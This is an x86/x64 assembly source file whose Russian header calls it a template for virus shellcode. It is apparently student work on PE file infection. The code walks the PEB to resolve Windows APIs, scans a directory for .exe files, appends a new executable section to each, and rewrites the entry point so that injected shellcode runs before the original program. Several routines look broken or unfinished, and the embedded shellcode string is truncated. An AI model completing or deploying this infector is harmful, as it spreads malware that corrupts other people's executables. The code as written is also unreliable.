;
; Шаблон для шеллкода вируса под Win32/Win64
;
; jwasm -bin -nologo -Fo main_64.bin /I "C:\wininc\Include" -10p -zf0 -W2 -D_WIN64 main.asm
; jwasm -bin -nologo -Fo main_32.bin /I "C:\masm32\include" -W2 main.asm
;
; Маткин Илья Александрович     23.11.2016
;

ifdef _WIN64
CurrentStdcallNotation equ <fastcall>
CurrentCdeclNotation equ <fastcall>
else
CurrentStdcallNotation equ <stdcall>
CurrentCdeclNotation equ <c>
.486
endif


option casemap:none
.model flat, CurrentStdcallNotation

LIST_ENTRY32 struct
    Flink dd ?
    Blink dd ?
LIST_ENTRY32 ends

;LIST_ENTRY64 struct
    ;Flink dd ?
    ;Blink dd ?
;LIST_ENTRY64 ends

ifdef _WIN64
CLIST_ENTRY typedef LIST_ENTRY64
; машинное слово текущей архитектуры
cword typedef qword
cax equ <rax>
cbx equ <rbx>
ccx equ <rcx>
cdx equ <rdx>
csi equ <rsi>
cdi equ <rdi>
csp equ <rsp>
cbp equ <rbp>
OFFSET_PEB equ <60h>
OFFSET_LDR equ <18h>
OFFSET_INIT_LIST equ <30h>
cur_seg_reg equ <gs>
else
CLIST_ENTRY typedef LIST_ENTRY32
; машинное слово текущей архитектуры
cword typedef cword
cax equ <eax>
cbx equ <ebx>
ccx equ <ecx>
cdx equ <edx>
csi equ <esi>
cdi equ <edi>
csp equ <esp>
cbp equ <ebp>
OFFSET_PEB equ <30h>
OFFSET_LDR equ <0Ch>
OFFSET_INIT_LIST equ <1Ch>
cur_seg_reg equ <fs>
endif


include pe_parser.inc
include Strings.mac

_ffd struct
    dwFileAttributes dd ?
    ftCreationTime FILETIME <>
    ftLastAccessTime FILETIME <>
    ftLastWriteTime FILETIME <>
    nFilcsizeHigh dd ?
    nFilcsizeLow dd ?
    dwReserved0 dd ?
    dwReserved1 dd ?
    cFileName db MAX_PATH dup(?)
    cAlternateFileName db 14 dup(?)
    dwFileType dd ?
    dwCreatorType dd ?
    wFinderFlags dw ?
_ffd ends

Stdcall0 typedef proto CurrentStdcallNotation
Stdcall1 typedef proto CurrentStdcallNotation :cword
Stdcall2 typedef proto CurrentStdcallNotation :cword, :cword
Stdcall3 typedef proto CurrentStdcallNotation :cword, :cword, :cword
Stdcall4 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword
Stdcall5 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword
Stdcall6 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword
Stdcall7 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall8 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall9 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
;StdcallVararg typedef proto CurrentStdcallNotation :vararg
CdeclVararg typedef proto CurrentCdeclNotation :vararg

DefineStdcallVarargProto macro name:req
    sc_&name equ <StdcallVararg ptr [cbx + p_&name - start]>
endm

DefineStdcallProto macro name:req, count:req
    sc_&name equ <Stdcall&count ptr [cbx + p_&name - start]>
endm

DefineCProto macro name:req
    sc_&name equ <CdeclVararg ptr [cbx + p_&name - start]>
endm

DefineStr macro name:req
    ;@CatStr(str,name) db "@CatStr(,name)", 0
    str_&name db "&name&", 0
endm

DefineStrOffsets macro name:req, strNames:vararg
    name:
    for i, <&strNames>
        cword offset str_&i
    endm
    name&Count = ($ - name) / sizeof(cword)
endm

DefinePointers macro name:req, namePointers:vararg
    name:
    for i, <&namePointers>
        p_&i cword 0
    endm
endm

DefineFuncNamesAndPointers macro funcNames:vararg
    for i, <&funcNames>
        DefineStr i
    endm
    DefineStrOffsets procNames, funcNames
    DefinePointers procPointers, funcNames
endm



FindProcAddressByName proto CurrentStdcallNotation :ptr byte
FindProcAddress proto CurrentStdcallNotation :ptr byte, :ptr byte
FindProcArray proto CurrentStdcallNotation :ptr byte, :ptr byte, :cword
InjectedCode proto CurrentStdcallNotation
RvaToOffset proto CurrentStdcallNotation :cword, :ptr PeHeaders
InjectCode proto CurrentStdcallNotation :ptr PeHeaders, :cword, :cword
AlignToTop proto CurrentStdcallNotation :cword, :cword
AlignToBottom proto CurrentStdcallNotation :cword, :cword
AddSection proto CurrentStdcallNotation :ptr PeHeaders, :cword, : cword, : cword
LoadPeFile proto CurrentStdcallNotation :cword, :cword, :cword
ParsePeFileHeader proto CurrentStdcallNotation :cword, :cword
printFileName proto CurrentStdcallNotation szFileName:ptr dword
SearchForFiles proto szDir:ptr dword, fileExtension:ptr dword, pe: ptr PeHeaders, func:ptr FileFunc
InjectFiles proto CurrentStdcallNotation hFile:ptr cword, pe:ptr PeHeaders 

DefineStdcallProto CreateFileA, 7
DefineStdcallProto GetFileSize, 2
DefineStdcallProto CreateFileMappingA, 6
DefineStdcallProto CloseHandle, 1
DefineStdcallProto MapViewOfFile, 5
DefineStdcallProto UnmapViewOfFile, 1
DefineStdcallProto FindFirstFileA, 2
DefineStdcallProto FindNextFileA, 2
DefineStdcallProto FindClose, 1
DefineStdcallProto GetSystemDirectoryA, 2
DefineStdcallProto FormatMessage, 1
DefineStdcallProto LocalFree, 1
DefineStdcallProto strlen, 1
DefineStdcallProto memcpy, 3
DefineStdcallProto strcpy, 2
DefineStdcallProto memset, 3

DefineCProto strlen
DefineCProto printf
DefineCProto sprintf
DefineCProto strcat
DefineCProto memcpy
DefineCProto strcpy
DefineCProto memset


sc segment write execute read

public start

start:
ifdef _WIN64
    lea cbx, start
else
    call $+5
    pop cbx
    sub cbx, 5
endif

main proc

local   pBase:cword
local   pLoadLibraryA:cword
local   pGetProcAddress:cword
local   hKernelLib:cword
local   hMsvcrtLib:cword
local   pExitProcess:cword
local   pe:PeHeaders
local 	i:cword
local 	memory:cword
local 	pe_:cword
local szDir[260]:byte
local szExt[10]:byte


	and csp, -16

    ; сохраняем базовый адрес
    mov [pBase], cbx
    
    ;;invoke sc_printf, addr [cbx + strFormat];;, addr [cbx + str_Hello]

    ; получаем адрес функции GetProcAddress в kernel32.dll
    invoke FindProcAddressByName, addr [cbx + str_GetProcAddress - start];;addr [cbx + str_GetProcAddress]
    mov [pGetProcAddress], cax
    ; pGetProcAddress = FindProcAddressByName ("GetProcAddress")

    ; получаем адрес функции LoadLibraryA в kernel32.dll
    invoke FindProcAddressByName, addr [cbx + str_LoadLibraryA - start]
    mov [pLoadLibraryA], cax
    ; pLoadLibrary = FindProcAddressByName ("LoadLibraryA")
    
    push cbx

    ; загружаем библиотеку kernel32.dll
    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Kernel32 - start]
    mov [hKernelLib], cax
    ; hUserLib = LoadLibraryA ("kernel32.dll")

    ; получаем адрес функции ExitProcess в kernel32.dll
    invoke Stdcall2 ptr [pGetProcAddress], [hKernelLib], addr [cbx + str_ExitProcess - start]
    mov [pExitProcess], cax
    ; pExitProcess = GetProcAddress (hKernelLib, "ExitProcess")

    ; загружаем библиотеку msvcrt.dll
    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Msvcrt - start]
    mov [hMsvcrtLib], cax
    ; hUserLib = LoadLibraryA ("msvcrt.dll")

	pop cbx
    invoke FindProcArray, addr [cbx + procNames - start], addr [cbx + procPointers - start], procNamesCount
    ; FindProcArray (procNames, procPointers, procNamesCount)
	
	invoke sc_memset, addr szDir, 0, 260
	invoke sc_memset, addr szExt, 0, 10
	
	 ; Copy the directory path to szDir
    invoke sc_strcpy, addr szDir, addr [cbx + dirPath - start]
    
     ; Copy the directory path to szDir
    invoke sc_strcpy, addr szExt, addr [cbx + exeExt - start]


	; Get addres of function
	lea cdi, InjectFiles

	; Call SearchForFiles
    invoke SearchForFiles, addr szDir, addr szExt, addr [pe], cdi
  
    invoke Stdcall1 ptr [pExitProcess], 0
    ; ExitProcess (0)
    
main endp

InjectFiles proc CurrentStdcallNotation hFile:ptr cword, pe:ptr PeHeaders 
	mov ccx, hFile
	invoke LoadPeFile, ccx, [pe], 0

    invoke InjectCode, addr[pe], glShellCode, sizeof(glShellCode)

	;;invoke UnloadPeFile, addr [pe]
	mov cdi, pe
	;assume cdi: ptr PeHeaders
	push cdi
	invoke sc_UnmapViewOfFile, [cdi].PeHeaders.mem
	pop cdi
	push cdi
    invoke sc_CloseHandle, [cdi].PeHeaders.mapd
    pop cdi
	push cdi
    invoke sc_CloseHandle, [cdi].PeHeaders.fd
    pop cdi
InjectFiles endp

printFileName proc CurrentStdcallNotation szFileName:ptr dword
    invoke sc_printf, addr [cbx + outputFormat - start], szFileName
    ret
printFileName endp

SearchForFiles proc CurrentStdcallNotation uses csi cdi ccx cax szDir:ptr dword, fileExtension:ptr dword, pe:ptr PeHeaders, func:ptr FileFunc
	local szExt[10]:byte
	local hFind:cword
	local ffd:_ffd
	
	invoke sc_memset, addr szExt, 0, 10

	; Initialize szExt
    invoke sc_sprintf, addr szExt, fileExtension
    
    ; Append szExt to szDir
    invoke sc_strcat, szDir, addr szExt
    
    ; Call FindFirstFile
    invoke FindFirstFileA, szDir, addr ffd
    mov hFind, cax

    ; Loop through the files
    cmp hFind, INVALID_HANDLE_VALUE
    je out_end

    do_loop:
		;movzx ccx, ffd
        test ffd._ffd.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        jz not_dir

    not_dir:
		;; func(ffd.cFileName);
		mov cdi, func ; Load the function pointer into cdi
		lea csi, ffd._ffd.cFileName
		push pe
		push csi ; Push the argument and call the function
		call cdi ; Call func
		add csp, 4 ; Restore the stack
		
        invoke sc_FindNextFileA, hFind, addr ffd
        cmp cax, 0
        jne do_loop

    out_end:
        invoke sc_FindClose, hFind
        ret
SearchForFiles endp

InjectedCode proc CurrentStdcallNotation uses cdi csi cbx
	call M
M:
        pop cax
        sub cax, 5
        push cbp

        ;;ebp указыват на начало внедряемого кода
        ;;перед ним должно быть 2 адреса
        mov cbp, cax

        ;;вызываем шеллкод
        mov cax, [cbp-8]
        call cax

        ;;передаем управление оригинальной точке входа
        mov cax, [cbp-4]
        pop cbp
        jmp cax
InjectedCode endp


InjectCode proc CurrentStdcallNotation uses cbx pe:ptr PeHeaders, code:cword, codeSize:cword
	local offsetNewSection: cword
	local rvaNewSection: cword

    ;;добавляем новую секцию и получаем ее виртуальный адрес и файловое смещение
	mov cax, sizeof(cword)
	mov cdi, 2
	mul cdi
	add cax, [codeSize]
	lea cdi, [InjectCode]
	lea ccx, [InjectedCode]
	sub cdi, ccx
	add cax, cdi
    invoke AddSection, pe, cax, [rvaNewSection], [offsetNewSection]

    mov cdx, pe	
    ;;assume cdx: ptr PeHeaders
    
    ;;помещаем адрес шеллкода
	mov cdi, [rvaNewSection]
	mov csi, [cdx].PeHeaders.nthead
	add cdi, [csi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
	xor cax, cax
	mov cax, sizeof(cword)
	mov ccx, 2
	mul ccx
	lea ccx, [InjectCode]
	lea cdi, [InjectedCode]
	add ccx, cdi
	mov cax, [cdx].PeHeaders.mem
	add cax, [offsetNewSection]
	mov dword ptr[cax], ccx

    ;;помещаем адрес оригинальной точки входа
    mov csi, [cdx].PeHeaders.nthead
	mov cdi, [csi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
	add cdi, [csi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
	mov cax, [cdx].PeHeaders.mem
	add cax, [offsetNewSection]
	mov dword ptr[cax + 4], cdi

    ;;копируем внедряемый код на место новой точки входа
	mov cax, sizeof(cword)
	mov cdi, 2
	mul cdi
	mov ccx, [cdx].PeHeaders.mem
	add ccx, [offsetNewSection]
	add cax, ccx
	lea cdi, [InjectCode]
	lea ccx, [InjectedCode]
	sub cdi, ccx

	push cdx
	invoke sc_memcpy, cax, addr [InjectedCode], cdi
	pop cdx

    ;;копируем шеллкод, который будет вызыван из внедренного кода
	mov cax, sizeof(cword)
	mov cdi, 2
	mul cdi
	mov ccx, [cdx].PeHeaders.mem
	add ccx, [offsetNewSection]
	add cax, ccx
	lea cdi, [InjectCode]
	lea ccx, [InjectedCode]
	sub cdi, ccx
	add cax, cdi

	push cdx
	invoke sc_memcpy, cax, code, [codeSize]
	pop cdx

    ;;устанавливаем точку входа на внедренный код
	mov cdi, [rvaNewSection]
	mov cax, sizeof(cword)
	mov ccx, 2
	mul ccx
	add cdi, cax
	mov csi, [cdx].PeHeaders.nthead
	mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
	mov dword ptr[cax], cdi
InjectCode endp


AlignToTop proc CurrentStdcallNotation uses cbx value:cword, align_:cword
	local mask_:cword
	
	mov cax, [mask_]
	mov cbx, [align_]
	dec cbx
	not cbx
	mov [mask_], cax

	mov cax, [value]
	add cax, [align_]
	dec cax
	and cax, [mask_]
	
    ret
AlignToTop endp


AlignToBottom proc CurrentStdcallNotation uses cbx value:cword, align_:cword
	local mask_:cword
	
	mov cax, [mask_]
	mov cbx, [align_]
	dec cbx
	not cbx
	mov [mask_], cax

	mov cax, [value]
	and cax, [mask_]
	
    ret
AlignToBottom endp

AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, newSectionSize:cword, rvaNewSection: cword, offsetNewSection: cword
    local align_: cword
	local last_section: ptr IMAGE_SECTION_HEADER
	local newImageSize : cword
	local newVirtualSize: cword
	local newFileSize: cword
	local newVirtualAndFileSize: cword
	local oldFileSize: cword
	
    mov ccx, pe	
    ;;assume ccx: ptr PeHeaders
	
	mov csi, [ccx].PeHeaders.nthead
	mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment
	mov [align_], cax
	mov [newImageSize], 0
	mov [newVirtualSize], 0
	mov [newFileSize], 0
	mov [newVirtualAndFileSize], 0
	mov cax, [ccx].PeHeaders.filesize
	
	;;last_section = pe->sections + pe->countSec;

    ;; Выравниваем новый размер по величине выравнивания в памяти.
	invoke AlignToTop, [newSectionSize], [align_]
	mov [newVirtualAndFileSize], cax

    ;; высчитываем виртуальный адрес и файловое смещение новой секции
    mov csi, [ccx].PeHeaders.nthead
    mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
	mov cdi, [csi].IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment
	push ccx
	invoke AlignToTop, cax, cdi
	pop ccx
	mov [rvaNewSection], cax
	
	mov cax, [ccx].PeHeaders.filesize
	mov cdi, [csi].IMAGE_NT_HEADERS.OptionalHeader.FileAlignment
	push ccx
	invoke AlignToTop, cax, cdi
	pop ccx
	mov [offsetNewSection], cax
	
    ;; Выгружаем файл и загружаем с увеличенным размером.
    ;; Новый блок будет заполнен нулями.
	;; invoke UnloadPeFile, addr [pe]
	mov ccx, pe
	;;assume ccx: ptr PeHeaders
	push ccx
	invoke sc_UnmapViewOfFile, [ccx].PeHeaders.mem
	pop ccx
	push ccx
    invoke sc_CloseHandle, [ccx].PeHeaders.fd
    pop ccx
	push ccx
    invoke sc_CloseHandle, [ccx].PeHeaders.mapd
    pop ccx
	
	mov cax, [offsetNewSection]
	mov cdi, [newVirtualAndFileSize]
	add cax, cdi
	
	mov ccx, pe	
    ;;assume ccx: ptr PeHeaders
	invoke LoadPeFile, [ccx].PeHeaders.filename, [pe], cax
	
	mov cax, pe
	mov cdi, [cax].PeHeaders.countSec
    mov ccx, [cax].PeHeaders.sections
    imul cdi, SIZEOF IMAGE_SECTION_HEADER
    add ccx, cdi
    mov [last_section], ccx
	
    ;; заполняем элемент в таблице для новой секции
    invoke sc_memset, dword ptr [last_section], 0, sizeof (IMAGE_SECTION_HEADER)
	
    invoke sc_printf, addr [cbx + strFormat - start], addr [last_section]
	invoke sc_strcpy, dword ptr [last_section], addr [cbx + new_sec - start]
	mov cax, [last_section]
	
	mov csi, [last_section]
	mov cdi, [newVirtualAndFileSize]
	mov [cax].IMAGE_SECTION_HEADER.Misc.VirtualSize, cdi
	
	mov cdi, [rvaNewSection]
	mov [cax].IMAGE_SECTION_HEADER.VirtualAddress, cdi
	
	mov cdi, [newVirtualAndFileSize]
	mov [cax].IMAGE_SECTION_HEADER.SizeOfRawData, cdi
	
	mov cdi, [offsetNewSection]
	mov [cax].IMAGE_SECTION_HEADER.PointerToRawData, cdi
	
	mov cdi, IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_CNT_CODE
	mov [cax].IMAGE_SECTION_HEADER.Characteristics, cdi	

    ;; увеличиваем количество секций
    mov ccx, pe	
    ;;assume ccx: ptr PeHeaders
    
    mov csi, [ccx].PeHeaders.nthead
	movzx cax, [csi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
	inc cax
	mov [csi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections, ax
    
    ;; обновляем размер образа программы
	mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
	push csi
	invoke AlignToTop, cax, [align_]
	add cax, [newVirtualAndFileSize]
	pop csi
	mov [csi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage, cax

    ret
AddSection endp


RvaToOffset proc CurrentStdcallNotation uses cbx ccx cdx cdi csi rva:cword, pe:ptr PeHeaders
	local i:cword
    local sections: ptr IMAGE_SECTION_HEADER
    local NumberSection:cword
    
    mov ccx, pe	
    ;;assume ccx: ptr PeHeaders

	mov cax, [ccx].PeHeaders.sections
	mov [sections], cax
	mov cax, [ccx].PeHeaders.countSec
	mov [NumberSection], cax

    mov csi, [ccx].PeHeaders.nthead
    mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage

    .if rva > cax
        mov cax, 0
        ret
    .endif

    ;;проходим по всем секциям и ищем
    ;;в какую попадает RVA
    mov [i], 0
    mov csi, [NumberSection]
    .while [i] < csi
        mov cax, [i]
        imul cax, sizeof(IMAGE_SECTION_HEADER)
        mov csi, [sections]
        add csi, cax
        mov ccx, [csi].IMAGE_SECTION_HEADER.VirtualAddress
		mov cdi, [csi].IMAGE_SECTION_HEADER.Misc.VirtualSize
		add cdi, ccx
        .if [rva] >= ccx && [rva] <= cdi
            mov ccx, [rva]
            mov cax, [i]
            imul cax, sizeof(IMAGE_SECTION_HEADER)
            mov csi, [sections]
            add csi, cax
            sub ccx, [csi].IMAGE_SECTION_HEADER.VirtualAddress
            add ccx, [csi].IMAGE_SECTION_HEADER.PointerToRawData
            mov cax, ccx
            ret
        .endif
        mov csi, [NumberSection]
        inc [i]
    .endw

    mov cax, 0
    ret
RvaToOffset endp


ParsePeFileHeader proc CurrentStdcallNotation uses cbx cdx mem:cword, pe:cword
	mov cdx, [pe]
    ;;assume cdx: ptr PeHeaders

    ;;указатель на заголовок PE
    mov cax, [cdx].PeHeaders.mem
    mov [cdx].PeHeaders.doshead, cax

    mov cdi, [cdx].PeHeaders.doshead
    movzx cax, [cdi].IMAGE_DOS_HEADER.e_magic
    .if cax != IMAGE_DOS_SIGNATURE
        invoke sc_UnmapViewOfFile, [cdx].PeHeaders.mem
        invoke sc_CloseHandle, [cdx].PeHeaders.mapd
        invoke sc_CloseHandle, [cdx].PeHeaders.fd
        ;invoke crt_printf, $CTA0("Error DOS signature\n");
        mov cax, 0
        ret
    .endif   

    ;;указатель на NT заголовок
    mov cax, [cdx].PeHeaders.mem
    mov cdi, [cdx].PeHeaders.doshead
    mov cdi, [cdi].IMAGE_DOS_HEADER.e_lfanew
    add cax, cdi
    mov [cdx].PeHeaders.nthead, cax
    mov cdi, [cdx].PeHeaders.nthead
    mov cdi, [cdi].IMAGE_NT_HEADERS.Signature

    .if cdi != IMAGE_NT_SIGNATURE
        invoke sc_UnmapViewOfFile, [cdx].PeHeaders.mem
        invoke sc_CloseHandle, [cdx].PeHeaders.mapd
        invoke sc_CloseHandle, [cdx].PeHeaders.fd
        ;;invoke crt_printf, $CTA0("Error NT signature\n");
        mov cax, 0
        ret
    .endif

    ;;получаем информацию о секциях
    mov cdi, [cdx].PeHeaders.nthead
    lea cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader
    movzx cdi, [cdi].IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
    add cax, cdi
    mov [cdx].PeHeaders.sections, cax
    mov cdi, [cdx].PeHeaders.nthead
    movzx cax, [cdi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    mov [cdx].PeHeaders.countSec, cax

    ;;получаем инфомацию об экспорте
    mov cdx, pe
    mov cdi, [cdx].PeHeaders.nthead
    mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
    .if cax
        mov ccx, [cdx].PeHeaders.mem
        mov cdi, [cdx].PeHeaders.nthead
        mov csi, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
        invoke RvaToOffset, csi, pe
        add cax, ccx
        mov [cdx].PeHeaders.expdir, cax
        mov cdi, [cdx].PeHeaders.nthead
        mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof(IMAGE_DATA_DIRECTORY)].isize
        mov [cdx].PeHeaders.sizeExpdir, cax
    .else
        mov [cdx].PeHeaders.expdir, 0
        mov [cdx].PeHeaders.sizeExpdir, 0
    .endif

    ;;получаем информацию об импорте
    mov cdx, pe
    mov cdi, [cdx].PeHeaders.nthead
    mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
    .if cax
        mov ccx, [cdx].PeHeaders.mem
        mov cdi, [cdx].PeHeaders.nthead
        mov csi, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
        invoke RvaToOffset, csi, pe
        add cax, ccx
        mov [cdx].PeHeaders.impdir, cax
        mov cdi, [cdx].PeHeaders.nthead
        mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT * sizeof(IMAGE_DATA_DIRECTORY)].isize
        mov [cdx].PeHeaders.sizeImpdir, cax
    .else
        mov [cdx].PeHeaders.impdir, 0
        mov [cdx].PeHeaders.sizeImpdir, 0
    .endif

    ret
ParsePeFileHeader endp


LoadPeFile proc CurrentStdcallNotation uses cbx filename:cword, pe:cword, filesize:cword
    mov ccx, [pe]
    ;;assume ccx: ptr PeHeaders

    mov cax, [filename]
    mov [ccx].PeHeaders.filename, cax
    
    push ccx
    invoke sc_CreateFileA, filename, GENERIC_READ or GENERIC_WRITE or GENERIC_EXECUTE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
	pop ccx
	
    mov [ccx].PeHeaders.fd, cax
    .if [ccx].PeHeaders.fd == INVALID_HANDLE_VALUE
        ;invoke PrintLastErrorMessage
        ;;invoke crt_puts, $CTA0 ("Error open file\n")
        xor cax, cax
        ret
    .endif
    
    .if [filesize]
        mov cax, [filesize]
        mov [ccx].PeHeaders.filesize, cax
    .else
		push ccx
        invoke sc_GetFileSize, [ccx].PeHeaders.fd, 0
        pop ccx
        mov [ccx].PeHeaders.filesize, cax
    .endif
   
	push ccx
    invoke sc_CreateFileMappingA, [ccx].PeHeaders.fd, 0, PAGE_READONLY, 0, [ccx].PeHeaders.filesize, 0
    pop ccx
    mov [ccx].PeHeaders.mapd, cax
    .if [ccx].PeHeaders.mapd == 0
        invoke sc_CloseHandle, [ccx].PeHeaders.fd
        ;;invoke crt_puts, $CTA0 ("Error create fie mapping\n")
        xor cax, cax
        ret
    .endif
    
    push ccx
    invoke sc_MapViewOfFile, [ccx].PeHeaders.mapd, FILE_MAP_READ, 0, 0, 0
    pop ccx
    mov [ccx].PeHeaders.mem, cax
    .if [ccx].PeHeaders.mem == 0
        invoke sc_CloseHandle, [ccx].PeHeaders.mapd
        invoke sc_CloseHandle, [ccx].PeHeaders.fd
        ;;invoke crt_puts, $CTA0 ("Error mapping file\n")
        xor cax, cax
        ret
    .endif

	push ccx
    invoke ParsePeFileHeader, [ccx].PeHeaders.mem, [pe]
    pop ccx
    .if !cax
        invoke sc_UnmapViewOfFile, [ccx].PeHeaders.mem
        invoke sc_CloseHandle, [ccx].PeHeaders.mapd
        invoke sc_CloseHandle, [ccx].PeHeaders.fd
        xor cax, cax
        ret
    .endif
    
    mov cax, 1
    ret    

LoadPeFile endp


; Осуществляет поиск адресов функций, смещения до имен которых от регистра ebx,
; переданы в первом аргументе funcNames.
; Адреса сохраняются по соответствующим индексам в массиве funcAddress.
; void FindProcArray (in char **funcNames, out void **funcAddress, int funcCount);
FindProcArray proc CurrentStdcallNotation uses cdi cbx funcNames:ptr byte, funcAddress:ptr byte, funcCount:cword
	local i:dword
	
    mov [i], 0

@@:
    mov cax, [i]
    cmp cax, [funcCount]
    jge @f
    
    mov cdi, [funcNames]
    mov cdi, [cdi + sizeof(cword) * cax]
    push cdi
    add cdi, cbx
    mov cdi, [funcAddress]
    lea cdi, [cdi + sizeof(cword) * cax]
    call FindProcAddressByName
    mov [cdi], cax
    
    inc [i]
    jmp @b
@@:

    ret

FindProcArray endp

;
; функция сравнения ASCII-строк
; bool CmpStr (char *str1, char *str2)
;
CmpStr:

    mov cax, [csp+sizeof(cword)]
    mov ccx, [csp+2*sizeof(cword)]
@@:
    mov dl, [cax]
    cmp dl, byte ptr [ccx]
    jne ret_false
    test dl, dl
    je ret_true
    inc cax
    inc ccx
    jmp @b

ret_false:
    xor cax, cax

    ; при равенстве строк возвращается адрес нулевого символа одной из строк
    ; но главное, что ненулевое значение
ret_true:
    retn 2 * sizeof(cword)


;
; Осуществляет поиск функции по имени во всех загруженных библиотеках из PEB'а.
; void * FindProcAddressByName (char * procName);
;
FindProcAddressByName proc CurrentStdcallNotation uses cdi cbx procName:ptr byte

	;;mov [cbp + 10h], ccx
	
    assume cur_seg_reg:nothing
    mov cbx, [cur_seg_reg:OFFSET_PEB]       ; cbx = ptr _PEB
    mov cbx, [cbx+OFFSET_LDR]      ; cbx = ptr _PEB_LDR_DATA
    lea cbx, [cbx+OFFSET_INIT_LIST]      ; cbx = ptr InInitializationOrderModuleList.Flink

    mov cdi, cbx            ; cdi = голова списка
    mov cbx, [cbx]          ; cbx = InInitializationOrderModuleList.Flink
    .while cbx != cdi
	
		
        ;push [procName]
        ;push cword ptr [cbx+sizeof(CLIST_ENTRY)]    ; LDR_DATA_TABLE_ENTRY.DllBase
                                    ; 10h - смещение от элемента InInitializationOrderLinks
        ;call FindProcAddress
		invoke FindProcAddress, cword ptr [cbx+sizeof(CLIST_ENTRY)], [procName]
        .if cax
            .break          ; в случае возврата cax будет содержать адрес функции
        .endif
        
        mov cbx, [cbx]          ; cbx = LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks.Flink
        xor cax, cax            ; обнуляем cax для возврата из функции
    .endw

    ret

FindProcAddressByName endp

;
; Осуществляет поиск адреса функции по ее имени в таблице экспорта
; void *FindProcAddress (void *baseLib, char *procName)
;
FindProcAddress proc CurrentStdcallNotation uses cdi csi cbx baseLib:ptr byte, procName:ptr byte

	local functionsArray:cword
	local namesArray:cword
	local nameOrdinalsArray:cword

    mov cbx, [baseLib]
    
    assume cbx: nothing
    mov eax, [cbx].IMAGE_DOS_HEADER.e_lfanew    ; cax = offset PE header
    
    ; esi = rva export directory
    mov esi, [cbx + cax].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    add csi, cbx                ; esi = va export directory
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions    ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
    add cax, cbx
    mov [functionsArray], cax
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfNames        ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfNames
    add cax, cbx
    mov [namesArray], cax
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfNameOcdinals
    add cax, cbx
    mov [nameOrdinalsArray], cax
    
    xor edi, edi

@@:
        cmp edi, [csi].IMAGE_EXPORT_DIRECTORY.NumberOfNames      ; cdi < IMAGE_EXPORT_DIRECTORY.NumberOfNames
        
        ; после сравнения строк на предыдущей итерации eax=0
        jge find_ret

        mov cax, [namesArray]
        mov eax, [cax+cdi*sizeof(dword)]
        add cax, cbx
        push [procName]
        push cax
        call CmpStr
        test cax, cax
        jne  @f

        inc edi
        jmp @b
@@:
    
    mov cax, [nameOrdinalsArray]
    movzx cdi, word ptr [cax+cdi*sizeof(word)]
    mov cax, [functionsArray]
    mov eax, [cax+cdi*sizeof(dword)]
    add cax, cbx
    
find_ret:
    
    ret

FindProcAddress endp

DefineStr ExitProcess
DefineStr LoadLibraryA
DefineStr GetProcAddress

str_Msvcrt db "msvcrt.dll", 0
str_Kernel32 db "kernel32.dll", 0
str_Hello db "hello.exe", 0
new_sec db ".new", 0
outputFormat db "%s", 13, 10, 0
dirPath db 'C:\Users\Labour\Downloads\hello', 0
exeExt db '\*.exe', 0

strCucdir:
db ".", 0, 0, 0, 0, 0, 0, 0
strFormat:
db "%s", 13, 10, 0
glShellCode db "\xe8\x00\x00\x00\x00\x5b\x83\xeb\x05\x55\x89"
